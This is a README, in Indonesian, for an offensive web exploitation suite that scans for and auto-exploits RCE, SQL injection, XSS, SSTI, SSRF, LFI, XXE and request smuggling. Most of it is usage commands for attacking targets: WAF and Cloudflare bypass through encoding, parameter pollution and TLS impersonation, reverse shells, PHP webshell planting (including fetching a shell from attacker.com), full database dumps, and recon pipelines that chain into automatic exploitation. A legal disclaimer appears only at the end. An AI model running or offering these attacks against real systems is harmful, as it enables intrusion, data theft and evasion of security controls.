# Zqrya-Exploit

```
▒███████▒  █████   ██▀███ ▓██   ██▓ ▄▄▄      ▓█████ ▒██   ██▒ ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▒ ▒ ▒ ▄▀░▒██▓  ██▒▓██ ▒ ██▒▒██  ██▒▒████▄    ▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
░ ▒ ▄▀▒░ ▒██▒  ██░▓██ ░▄█ ▒ ▒██ ██░▒██  ▀█▄  ▒███   ░░  █   ░▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
  ▄▀▒   ░░██  █▀ ░▒██▀▀█▄   ░ ▐██▓░░██▄▄▄▄██ ▒▓█  ▄  ░ █ █ ▒ ▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░
▒███████▒░▒███▒█▄ ░██▓ ▒██▒ ░ ██▒▓░ ▓█   ▓██▒░▒████▒▒██▒ ▒██▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░
░▒▒ ▓░▒░▒░░ ▒▒░ ▒ ░ ▒▓ ░▒▓░  ██▒▒▒  ▒▒   ▓▒█░░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░
░░▒ ▒ ░ ▒ ░ ▒░  ░   ░▒ ░ ▒░▓██ ░▒░   ▒   ▒▒ ░ ░ ░  ░░░   ░▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░
░ ░ ░ ░ ░   ░   ░   ░░   ░ ▒ ▒ ░░    ░   ▒      ░    ░    ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░
  ░ ░        ░       ░     ░ ░           ░  ░   ░  ░ ░    ░               ░  ░    ░ ░   ░
░                          ░ ░
```

> **All-in-One Web Exploitation Suite** — scanner + exploiter untuk pengujian
> keamanan web. Satu tool untuk **RCE / SQLi / XSS / SSTI / SSRF / LFI / XXE /
> open redirect / CORS / CRLF / request smuggling / blind OOB / recon /
> auto-exploit**, dengan dukungan **bypass WAF** dan **GUI desktop**.

<p align="center">
<img src="https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white&style=for-the-badge">
<img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-2ea44f?style=for-the-badge">
<img src="https://img.shields.io/badge/UI-CLI%20%2B%20GUI%20(Tkinter)-8B5CF6?style=for-the-badge">
<img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge">
<br>
<img src="https://img.shields.io/badge/Exploits-RCE%E2%80%A2SQLi%E2%80%A2XSS%E2%80%A2SSTI%E2%80%A2SSRF%E2%80%A2LFI%E2%80%A2XXE-e11d48?style=for-the-badge">
<img src="https://img.shields.io/badge/WAF%20Bypass-Encoding%20%2B%20Tamper%20%2B%20Impersonate-22d3ee?style=for-the-badge">
<img src="https://img.shields.io/badge/Tests-87%20passing-22c55e?style=for-the-badge">
<img src="https://img.shields.io/badge/Demo-Animated%20GIF-f97316?style=for-the-badge">
</p>

---

## Demo

![Zqrya-Exploit demo](https://raw.githubusercontent.com/webdev11-code/shell-injection/main/assets/demo.gif)

*Rekaman simulasi: mode WAF (`--waf`) menembus filtering, lalu RCE
`id; uname -a` dieksekusi pada parameter rentan.*

---

## Daftar Isi

1. [Fitur Utama](#fitur-utama)
2. [Instalasi](#instalasi)
3. [Mengunduh File Besar (Git LFS)](#mengunduh-file-besar-git-lfs)
4. [Dukungan Platform](#dukungan-platform)
5. [Antarmuka GUI](#antarmuka-gui)
6. [Antarmuka CLI](#antarmuka-cli)
7. [Mode Scan](#mode-scan)
8. [Cara Pakai — Contoh](#cara-pakai--contoh)
9. [Encoding Payload & Bypass WAF](#encoding-payload--bypass-waf)
10. [Mesin Exploit Vendored](#mesin-exploit-vendored)
11. [Recon: subdomain → crawl → scan → exploit](#recon-subdomain--crawl--scan--exploit)
12. [Blind / OOB (DNS & HTTP exfiltration)](#blind--oob-dns--http-exfiltration)
13. [Reverse Shell & Web Shell](#reverse-shell--web-shell)
14. [SQL Injection Dump](#sql-injection-dump)
15. [Laporan Hasil Scan](#laporan-hasil-scan)
16. [Sumber Payload](#sumber-payload)
17. [Struktur Folder](#struktur-folder)
18. [Testing](#testing)
19. [Peringatan Hukum](#peringatan-hukum)
20. [Status Pengembangan](#status-pengembangan)

---

## Fitur Utama

| Kategori | Kemampuan |
|---|---|
| 🔴 **Command Injection / RCE** | chaining (`;` `\|` `&&` `\n`), `$()`/backtick, bypass spasi (`${IFS}`), bypass keyword, time-based, eksekusi command (`--exec`), shell interaktif (`--shell`) |
| 🔵 **SQL Injection** | error-based (17 tanda error DB), boolean-based, time-based (`SLEEP`/`WAITFOR`/`pg_sleep`), versi DB (extractvalue/updatexml), **dump penuh** UNION + blind |
| 🟣 **XSS / SSTI** | reflected XSS (marker acak), template injection (`{{7*7}}`, `${7*7}`, `<%= %>`) |
| 🟠 **SSRF / XXE / LFI / RFI** | callback OOB, entity eksternal, `../../etc/passwd`, `php://filter`, `proc/self/environ`, `win.ini` |
| 🟡 **Infra/Web** | open directory listing, open redirect, CORS misconfig, CRLF header injection, HTTP request smuggling (CL.TE/TE.CL/TE.TE), file sensitif (`/.env`, `/.git/config`, `phpinfo.php`, actuator) |
| 🛡️ **Bypass WAF** | `--waf` (auto-encode), 6 mode encoding, tamper (`hpp`/`whitespace`), impersonasi browser TLS (`--impersonate`), proxy, cookie relay, payload obfuscation |
| 🧭 **Recon & Auto** | subdomain enumeration (crt.sh + brute DNS), crawling form/link, `--crawler` pipeline, `--auto` penuh, auto-exploit |
| 🎯 **Blind / OOB** | listener HTTP + DNS lokal, mode collaborator (`--oob-domain`), payload `nslookup`/`dig`/`curl`/`wget` |
| 💻 **Shell** | reverse shell (bash/nc/python/perl/php/ruby/socat/awk), PHP webshell upload, fetch shell remote |
| 📦 **Mesin Tools** | `zq-radar` (mass scan), `zq-fuzzer` (dirscan), `zq-hunter` (subdomain), `zyra-sqli` (SQLi full) — semuanya di-launch dari sini |
| 📄 **Laporan** | output `.html` / `.json` / `.txt`, save report di GUI |

---

## Instalasi

### Persyaratan

| Kebutuhan | Keterangan |
|---|---|
| Python | **3.8+** ([python.org](https://python.org), centang *Add to PATH* di Windows) |
| `requests` | dependency satu-satunya; otomatis terpasang saat `pip install .` |
| Tkinter | **opsional** — untuk GUI (Linux: `sudo apt install python3-tk`) |
| `curl_cffi` | **opsional** — untuk `--impersonate` |
| `nmap` / `netcat-openbsd` | **opsional** — mesin Go & listener `nc` (Linux) |

### Windows

```powershell
git clone https://github.com/webdev11-code/shell-injection
cd zqrya-exploit
python -m pip install .          # install package + launcher `zqrya`
```

- Launcher otomatis jadi `zqrya.exe` (bisa langsung dipanggil dari mana saja).
- Tanpa `nc`? Listener Python bawaan dipakai otomatis.
- `zq-radar` (file LFS) **tidak wajib** — Windows otomatis memakai fallback native Python.
- Mesin SQLi `zyra-sqli` jalan penuh (launcher `tools/bin/zq-dbstrike.py`).

### Linux

```bash
git clone https://github.com/webdev11-code/shell-injection
cd zqrya-exploit

# 1. Dependensi sistem (GUI Tkinter; tanpa ini tool tetap jalan mode CLI)
sudo apt install -y python3 python3-tk
#    Fedora: sudo dnf install python3 python3-tkinter

# 2. Install package
python3 -m pip install .

# 3. (opsional) untuk mesin Go & listener nc
sudo apt install -y nmap netcat-openbsd

# 4. (opsional) untuk mesin radar asli (±138 MB, file Git LFS)
python zqrya.py --cli --fetch-tools
```

### Verifikasi

```bash
zqrya --cli --tools                # cek mesin terpasang (radar/fuzzer/hunter/zyra-sqli)
zqrya --cli https://target.com --crawler -o report.html
python -m zqrya_exploit --cli --tools   # alternatif via module
python zqrya.py --cli --tools           # alternatif dari source checkout
```

> Tanpa `tkinter`, GUI otomatis fallback ke mode CLI. Bisa juga dipaksa CLI
> dengan flag `--cli`.

---

## Mengunduh File Besar (Git LFS)

`zq-radar` (±138 MB) disimpan via **Git LFS** — saat `git clone` Anda mendapat
*pointer*, bukan binary-nya. Unduh dengan salah satu cara:

```bash
# Cara 1 (CLI): tool mengunduh otomatis (pakai git-lfs, atau LFS batch API murni urllib)
python zqrya.py --cli --fetch-tools

# Cara 2: manual
git lfs pull

# Cek status: mesin yang belum punya file akan ditandai "[LFS]"
python zqrya.py --cli --tools
```

- **GUI**: tombol **"Fetch Tools (LFS)"** di panel *Mesin Tools* melakukan unduhan yang sama.
- Kalau mesin yang belum diunduh tetap dipakai (`--radar` / tombol GUI), tool
  menampilkan peringatan dan meminta `--fetch-tools` dulu.
- Windows **tidak memerlukan** `zq-radar` (fallback Python dipakai otomatis).

---

## Dukungan Platform

| Aspek | Windows | Linux |
|---|---|---|
| CLI | ✅ | ✅ |
| GUI (Tkinter) | ✅ (bawaan Python) | ✅ (`python3-tk`) |
| Mesin `zyra-sqli` (SQLi full) | ✅ launcher Python | ✅ |
| Mesin Go (`radar`/`fuzzer`/`hunter`) | ⚠️ fallback native Python | ✅ binary asli |
| Listener `nc` | ⚠️ fallback listener Python | ✅ (jika `netcat` terpasang) |
| Banner & log UTF-8 | ✅ (`_fix_console()` + ANSI VT) | ✅ |

> Banner di terminal berwarna **gradasi** (merah → kuning) dan log berwarna
> per-tingkat: `[*]` cyan (info), `[+]` hijau (sukses), `[-]` merah (gagal),
> `[!]` kuning (peringatan), `[VULN]` merah tebal, label `>>` magenta, URL disorot.
> Warna otomatis dimatikan saat output dipipe / `NO_COLOR` di-set.

---

## Antarmuka GUI

```bash
python zqrya.py          # tanpa --cli → GUI
```

| Area | Fungsi |
|---|---|
| **Ganti URL (Modal)** | masukkan target, mis. `http://target.com/index.php?cmd=id` |
| **Scan Shell Injection** | uji semua query parameter dengan payload RCE (echo marker + time-based) |
| **Scan Directory / Traversal** | cek open listing + path traversal ke file sensitif |
| **Run Command (Inject)** | cari parameter rentan lalu eksekusi command berulang via dialog |
| **SQLi Dump** | dump database penuh dari parameter SQL rentan |
| **Mode** (dropdown) | all / injection / sqli / ssti / ssrf / xss / lfi / xxe / redirect / headers / smuggling / directory / oob / recon |
| **Encoding** (dropdown) | none / url / double-url / hex / double-hex / auto |
| **WAF** (checkbox) | aktifkan mode WAF (auto-encode) |
| **Tamper** (dropdown) | none / hpp / whitespace / all |
| **Impersonate** (dropdown) | chrome / edge / safari / firefox (butuh `curl_cffi`) |
| **Proxy / Cookie** (field) | route via proxy; kirim cookie mentah (mis. `cf_clearance=...`) |
| **Mesin Tools** | Hunter, Radar, Fuzzer, SQLi Full (zyra-sqli), Reverse Shell, Web Shell, Update Payloads, **Fetch Tools (LFS)** |
| **Wordlist** | pilih file wordlist custom untuk fuzz directory |
| **Save Report** | simpan hasil sebagai `.html` / `.json` / `.txt` |

---

## Antarmuka CLI

```bash
zqrya --cli [URL] [opsi...]
```

### Referensi opsi lengkap

| Opsi | Fungsi |
|---|---|
| `URL` | URL target (mis. `http://localhost/vuln.php?cmd=id`) |
| `--mode MODE` | jenis scan — lihat [Mode Scan](#mode-scan) (default: `all`) |
| `--exec CMD` | eksekusi satu command pada parameter rentan |
| `--shell` | buka shell interaktif pada parameter rentan |
| `--param NAME` | nama parameter target (`--exec`/`--shell`/`--rshell`/`--webshell`) |
| `--encode MODE` | `none` / `url` / `double-url` / `hex` / `double-hex` / `auto` (default `none`) |
| `--waf` | mode WAF = `--encode auto` + payload bypass keyword |
| `--tamper T` | `none` / `hpp` / `whitespace` / `all` — ditumpuk dengan `--encode` |
| `--impersonate B` | `chrome` / `chrome110` / `chrome131` / `edge` / `safari` / `firefox` (butuh `curl_cffi`) |
| `--proxy URL` | route semua request via proxy (mis. Burp) |
| `--cookie STR` | kirim cookie mentah (solusi challenge Cloudflare) |
| `--rshell [TYPE]` | luncurkan reverse shell (default `bash`; daftar: `--rshell-list`) |
| `--lhost IP` / `--lport P` | LHOST/LPORT reverse shell (default port 4444) |
| `--rshell-list` | tampilkan daftar tipe reverse shell |
| `--listen PORT` | buka listener lokal (nc atau Python fallback) |
| `--webshell` | tulis PHP webshell inline ke target |
| `--fetch-shell URL` | unduh shell dari URL lalu tulis ke target |
| `--webshell-path PATH` | path tujuan webshell di target |
| `--webshell-url URL` | URL akses webshell (hanya dicetak) |
| `--oob-host` / `--oob-port` / `--oob-dns-port` | listener OOB lokal (HTTP/DNS) |
| `--oob-type T` | `http` / `dns` / `both` (default `both`) |
| `--oob-wait DETIK` | lama menunggu callback (default 15) |
| `--oob-domain DOMAIN` | mode collaborator manual (interactsh / Burp Collaborator) |
| `--auto-exploit` | mode recon: exploit otomatis param yang terbukti rentan |
| `--crawler` | pipeline lengkap: subdomain + crawl + scan semua payload + inject |
| `--auto` | otomatis penuh: recon + semua vuln + exploit + SQLi dump |
| `--sqli-dump` | dump database (databases → tables → columns → data) |
| `--sqli-query SQL` | jalankan query SQL arbitrer via UNION |
| `--ssrf-host` / `--ssrf-port` | listener SSRF (default port 8080) |
| `--update-payloads` | unduh payload PayloadsAllTheThings ke `./payloads/` |
| `--threads N` | thread paralel (default 20) |
| `--tools` | daftar mesin tool terpasang lalu keluar |
| `--fetch-tools` | unduh file LFS yang diperlukan mesin tool |
| `--radar` | jalankan mesin radar (deteksi massal) |
| `--dbstrike` | jalankan mesin dbstrike = zyra-sqli (SQLi full) |
| `--fuzzer` | jalankan mesin fuzzer (dirscan) |
| `--hunter` | jalankan mesin hunter (subdomain) |
| `--tool-args "..."` | argumen tambahan yang diteruskan ke mesin tool |
| `--subdomain-wordlist FILE` | wordlist brute subdomain |
| `--max-pages N` / `--max-depth N` / `--delay DETIK` | kendali crawler (default 100/3/0.1) |
| `--wordlist FILE` | wordlist directory scan |
| `-o FILE` | simpan laporan (`.txt` / `.json` / `.html`) |

---

## Mode Scan

| Mode | Keterangan |
|---|---|
| `injection` | command injection (RCE) — payload `;`, `\|`, `$()`, backtick, bypass spasi/keyword, time-based |
| `sqli` | SQL injection — error/boolean/time-based |
| `xss` | reflected XSS dengan marker acak |
| `ssti` | server-side template injection |
| `ssrf` | server-side request forgery (callback OOB) |
| `lfi` | local/remote file inclusion (`../../etc/passwd`, `php://filter`) |
| `xxe` | XXE entity external → callback OOB |
| `redirect` | open redirect via header `Location` |
| `headers` | CORS misconfig + CRLF header injection |
| `smuggling` | HTTP request smuggling (CL.TE / TE.CL / TE.TE) |
| `directory` | open directory listing + path traversal |
| `oob` | blind command injection via callback out-of-band |
| `recon` | subdomain enumeration + crawl + scan |
| `all` | **default** — semua mode di atas |

---

## Cara Pakai — Contoh

### Scan cepat semua kerentanan

```bash
zqrya --cli http://localhost/vuln.php?cmd=id --mode all
```

### Pipeline satu perintah

```bash
# subdomain + crawl + scan semua payload (semua encoding) + auto-inject
zqrya --cli https://target.com --crawler -o target.html
```

`--crawler` = `--mode recon --encode auto --auto-exploit`.

### Scan per jenis

```bash
zqrya --cli http://localhost/ --mode directory --threads 50
zqrya --cli http://localhost/ --mode directory --wordlist wordlist.txt
zqrya --cli http://localhost/vuln.php?cmd=id --mode injection --encode double-url
```

### Eksekusi command & shell interaktif

```bash
zqrya --cli http://localhost/vuln.php?cmd=id --exec "id; uname -a"
zqrya --cli http://localhost/vuln.php --shell
zqrya --cli http://localhost/vuln.php --shell --param cmd
```

### Automasi penuh

```bash
zqrya --cli https://target.com --auto -o report.html
```

---

## Encoding Payload & Bypass WAF

### Mode encoding (`--encode`)

| Mode | Keterangan |
|---|---|
| `none` | plain (default) |
| `url` | percent-encode karakter khusus (`%3B%20...`) |
| `double-url` | percent-encode dua kali (`%253B%2520...`) |
| `hex` | encode tiap byte termasuk huruf/angka (`%3b%20%65...`) |
| `double-hex` | hex lalu di-url-encode lagi |
| `auto` | coba semua mode untuk tiap payload |

```bash
zqrya --cli http://localhost/vuln.php?cmd=id --encode hex --exec "id"
zqrya --cli http://localhost/vuln.php?cmd=id --encode auto --mode injection
```

Selain encoding transport, exploit juga mencoba command yang di-hex-encode
(`printf <hex> \| xxd -r -p \| sh`, `bash -c $'\x..'`) untuk bypass filter
karakter pada command.

### Mode WAF (`--waf`)

Bila target ada di belakang WAF (banyak respons `403`), aktifkan `--waf`
(shortcut `--encode auto` + varian bypass keyword `e''c''h''o`, backslash-escape,
`${IFS}`, separator tanpa `;` — newline/CRLF/tab):

```bash
# Deteksi + exploit menembus WAF (klasik: WAF single-decode, aplikasi double-decode)
zqrya --cli http://target/?cmd=id --mode injection --waf
zqrya --cli http://target/?cmd=id --exec "id; uname -a" --waf
```

Saat deteksi gagal, tool mencetak peringatan *"kemungkinan diblokir WAF"* dan
menyarankan `--waf`. Contoh bypass terverifikasi: WAF memblokir `;|&`, backtick,
`$()`, karakter kontrol, dan keyword command — ditembus via `--encode url`
(double-encode di wire → WAF hanya decode sekali, aplikasi double-decode menerima
payload asli).

### Cloudflare & AWS WAF (`--impersonate`, `--proxy`, `--cookie`)

WAF ketat punya dua lapis: **rules engine** (menormalisasi & meng-decode URL) dan
**bot detection** (TLS/JA3 + HTTP/2 fingerprint, challenge).

| Opsi | Kegunaan |
|---|---|
| `--waf` | bypass rules engine: auto-coba encoding + payload obfuscation |
| `--impersonate BROWSER` | impersonasi TLS/HTTP2 ala browser (butuh `pip install curl_cffi`) — lawan bot-detection Cloudflare / AWS Bot Control |
| `--proxy URL` | route semua request via proxy (Burp / rotating) untuk ganti IP & inspeksi |
| `--cookie "cf_clearance=..."` | teruskan cookie browser — solusi challenge Cloudflare (selesaikan challenge di browser → salin cookie → jalankan tool) |

```bash
pip install curl_cffi   # sekali, untuk --impersonate

# Deteksi + RCE menembus Cloudflare-class WAF
zqrya --cli https://target/?cmd=id --waf --impersonate chrome \
      --proxy http://127.0.0.1:8080
zqrya --cli https://target/?cmd=id --exec "id; uname -a" \
      --waf --impersonate chrome --cookie "cf_clearance=abc123"
```

### Tamper payload (`--tamper`)

Untuk WAF rules-engine yang lolos dari variasi encoding saja — **ditumpuk**
dengan `--encode` (auto-coba kombinasi encode × tamper):

| Tamper | Cara |
|---|---|
| `hpp` | HTTP Parameter Pollution: `?cmd=SAFE&cmd=PAYLOAD` — banyak WAF hanya cek kemunculan pertama, aplikasi (mis. PHP) pakai nilai terakhir |
| `whitespace` | ganti spasi dengan TAB (whitespace valid di shell) |
| `all` | coba none, whitespace, dan hpp untuk tiap payload |

```bash
zqrya --cli https://target/?cmd=id --mode injection --waf --tamper all
zqrya --cli https://target/?cmd=id --exec "id" --tamper hpp
```

Header default sudah ala browser (`sec-ch-ua`, `accept-language`, dll.). Saat
respons berupa halaman challenge Cloudflare ("Just a moment", `cf-mitigated`),
tool mencetak peringatan dan menyarankan `--cookie` + `--impersonate`.

> **Catatan jujur**: tidak ada bypass universal untuk Cloudflare/AWS yang
> dikonfigurasi ketat. Kombinasi di atas menaikkan peluang dengan meniru browser
> dan mengakali rules engine, tetapi efektivitas tetap tergantung konfigurasi
> WAF, origin (apakah double-decode), dan kebijakan challenge target.

---

## Mesin Exploit Vendored

Empat mesin `Zqrya-Exploit` sudah terpasang lokal (identitas sudah di-rebrand
dari source):

```bash
zqrya --cli https://target.com --hunter               # hunter : subdomain
zqrya --cli https://target.com --radar                # radar  : deteksi massal
zqrya --cli https://target/vuln.php?id=1 --dbstrike   # zyra-sqli : SQLi dump full
zqrya --cli https://target.com --fuzzer --wordlist wordlist.txt  # fuzzer : fuzz dir
```

Flag tambahan diteruskan apa adanya via `--tool-args`:

```bash
zqrya --cli https://target/vuln.php?id=1 --dbstrike --tool-args "--dump --threads 8"
zqrya --cli https://target.com --radar --tool-args "-severity critical"
zqrya --cli https://target.com --fuzzer --tool-args "-mr 'Response contains login'"
```

Kalau mesin vendored tidak ada, tool otomatis **fallback ke implementasi native**
(crt.sh + brute DNS, multi-vuln scan, UNION + blind SQLi dump, dir fuzz internal).
Di Windows binari Go dilewati dan native fallback dipakai otomatis.

---

## Recon: subdomain → crawl → scan → exploit

Pipeline: enumerasi subdomain (pasif crt.sh + opsional brute DNS) → crawling
URL/form dalam scope → scan tiap endpoint untuk **command injection + XSS + SQLi**
→ (opsional) exploit parameter yang terbukti rentan.

```bash
# recon + scan (tanpa exploit)
zqrya --cli example.com --mode recon

# recon + auto-exploit (command konfirmasi aman: id; uname -a; hostname)
zqrya --cli example.com --mode recon --auto-exploit

# lengkap: brute subdomain + atur kedalaman/halaman + encoding
zqrya --cli example.com --mode recon --auto-exploit \
    --subdomain-wordlist subdomains.txt --max-depth 4 --max-pages 300 \
    --delay 0.2 --encode none
```

- Scope crawl = domain utama + subdomain (link eksternal dilewati).
- Enumerasi pasif via [crt.sh](https://crt.sh); brute DNS pakai `--subdomain-wordlist`.

---

## Blind / OOB (DNS & HTTP exfiltration)

Deteksi blind command injection tanpa output via callback out-of-band.

**Mode lokal (auto-detect)** — tool membuka listener HTTP + DNS sendiri:

```bash
# HTTP saja (tidak butuh root)
zqrya --cli http://localhost/vuln.php?cmd=id --mode oob --oob-type http

# HTTP + DNS (DNS butuh root karena bind port 53)
zqrya --cli http://localhost/vuln.php?cmd=id --mode oob --oob-type both

# atur IP/port sendiri
zqrya --cli http://localhost/vuln.php?cmd=id --mode oob \
    --oob-host 10.0.0.5 --oob-port 8080 --oob-wait 20
```

**Mode collaborator (manual)** — arahkan callback ke Burp Collaborator /
interactsh, cek marker di dashboard:

```bash
zqrya --cli http://localhost/vuln.php?cmd=id --mode oob \
    --oob-domain xyz123.interactsh.com
```

Payload OOB: **DNS** — `nslookup`, `dig`, `host`; **HTTP** — `curl`, `wget`,
`python`, `python3`.

---

## Reverse Shell & Web Shell

### Reverse shell

Luncurkan listener dulu (terminal lain):

```bash
nc -lvnp 4444
# atau
zqrya --cli --listen 4444
```

Lalu dari target:

```bash
zqrya --cli http://localhost/vuln.php?cmd=id \
    --rshell bash --lhost 192.168.1.10 --lport 4444

# tipe lain & daftar
zqrya --cli http://localhost/vuln.php --rshell python3 --lhost 10.0.0.5
zqrya --cli --rshell-list
```

Tipe: bash, nc, python, python3, perl, php, ruby, socat, awk.

### Web shell

```bash
# tulis PHP webshell inline (via base64) ke path target
zqrya --cli http://localhost/vuln.php?cmd=id \
    --webshell --webshell-path /var/www/html/x.php \
    --webshell-url http://localhost/x.php
# akses: http://localhost/x.php?cmd=id

# atau unduh shell yang sudah kamu host sendiri
zqrya --cli http://localhost/vuln.php?cmd=id \
    --fetch-shell http://attacker.com/shell.php \
    --webshell-path /var/www/html/x.php
```

---

## SQL Injection Dump

Ekstraksi penuh ala zyra-sqli dasar — jumlah kolom (ORDER BY) → databases →
tables → columns → data via UNION SELECT (MySQL/information_schema), plus query
SQL arbitrer. Fallback otomatis ke **blind boolean/time-based** (binary search
per char) bila UNION in-band gagal.

```bash
zqrya --cli http://localhost/vuln.php?id=1 --sqli-dump
zqrya --cli http://localhost/vuln.php?id=1 --sqli-query "select group_concat(table_name) from information_schema.tables"
```

---

## Laporan Hasil Scan

**CLI** — simpan hasil via `-o` (format otomatis dari ekstensi):

```bash
zqrya --cli http://localhost/ --mode all -o report.txt
zqrya --cli http://localhost/ --mode all -o report.json
zqrya --cli https://target.com --crawler -o report.html
```

- `.txt` — plain text
- `.json` — terstruktur (untuk diproses)
- `.html`/`.htm` — laporan web dengan tabel findings + log

**GUI** — klik **Save Report** setelah scan; pilih lokasi & format
(`.html` / `.txt` / `.json`).

> Jika `requests` tidak terpasang, tool otomatis fallback ke `urllib` bawaan Python.

---

## Sumber Payload

Payload digabung dari referensi publik (untuk kelengkapan bypass):

- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — Command Injection](https://hacktricks.wiki/en/pentesting-web/command-injection.html)
- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- OWASP testing guide

Kategori payload: chaining (`;` `|` `||` `&&` `&` `\n` `\r\n` `\t`),
substitusi perintah (`$()` backtick), bypass spasi (`${IFS}` `$IFS$9` `$@`
brace expansion), bypass keyword (quote/backslash/subshell insert), dan
time-based (`sleep`, `ping`).

Perbarui dengan payload terbaru dari repo PayloadsAllTheThings:

```bash
zqrya --cli --update-payloads
```

---

## Struktur Folder

```
zqrya.py                      # shim backward-compat (python zqrya.py)
setup.py / pyproject.toml     # build & bundling package
MANIFEST.in                   # daftar file yang ikut ke wheel
requirements.txt              # dependency (requests)
assets/
  demo.gif                    # animasi demo untuk README
zqrya_exploit/
  __init__.py                 # versi + entry point `main`
  __main__.py                 # python -m zqrya_exploit
  core.py                     # engine utama (scanner + exploiter + GUI + WAF bypass)
  wordlist.txt                # wordlist fuzz bawaan
  tools/
    dbstrike/                 # mesin zyra-sqli (SQLi full, Python — di-rebrand dari source)
    bin/
      zq-dbstrike.py          # launcher lintas-platform mesin zyra-sqli
      zq-dbstrike.cmd         # launcher Windows (opsional)
      zq-radar                # binary mesin radar (Linux, Git LFS ±138 MB)
      zq-fuzzer               # binary mesin fuzzer (Linux)
      zq-hunter               # binary mesin hunter (Linux)
payloads/                     # payload PayloadsAllTheThings (hasil --update-payloads)
reports/                      # laporan output
tests/                        # unit test (stdlib unittest, offline)
```

---

## Testing

Test suite (stdlib `unittest`, offline — semua berjalan di server HTTP lokal):

```bash
python3 -m unittest discover -s tests -v
```

Cakupan: helper & encoding, `Report`/`ScanLogger`, helper HTTP (requests +
fallback urllib), `FormParser`/`crawl_forms`, command injection (deteksi +
exploit + time-based), SQLi (error/boolean/time, UNION dump, blind extract),
XSS/SSTI/LFI/open redirect/CORS/CRLF, HTTP Request Smuggling (CL.TE/TE.CL/TE.TE),
dan WAF bypass encoding.

---

## Peringatan Hukum

Gunakan **hanya** pada sistem milikmu sendiri atau sistem yang sudah kamu dapat
izin tertulis untuk diuji (**authorized penetration testing**). Menguji atau
mengeksekusi perintah pada sistem pihak lain tanpa izin adalah tindakan ilegal.
Pengguna bertanggung jawab penuh atas penggunaan tool ini.

---

## Status Pengembangan

- **Banner & terminal berwarna**: banner ASCII font *bloody* dengan gradasi
  merah → kuning (tanpa kotak), log berwarna per-tingkat, ANSI VT aktif di
  Windows, warna otomatis mati saat non-TTY/`NO_COLOR`.
- **WAF bypass suite**: `--waf`, 6 mode encoding, tamper (`hpp`/`whitespace`),
  `--impersonate` (curl_cffi), `--proxy`, `--cookie`, deteksi challenge
  Cloudflare, payload obfuscation (quote-obfuscation `e''c''h''o`,
  backslash-escape, `${ECHO,,}`, newline separator).
- **Git LFS**: `zq-radar` (±138 MB) disimpan via LFS; `--fetch-tools` mengunduh
  otomatis (git-lfs atau LFS batch API), GUI tombol "Fetch Tools (LFS)".
- **Mesin vendored**: 3 binary Go di-recompile dengan identitas sendiri;
  `zyra-sqli` (vendor dbstrike) di-rebrand penuh dari sqlmap, launcher
  lintas-platform.
- Checklist lanjutan & catatan kerja ada di [`update.md`](update.md).

---

*Zqrya-Exploit — dibangun untuk pengujian keamanan yang etis. Jangan disalahgunakan.*
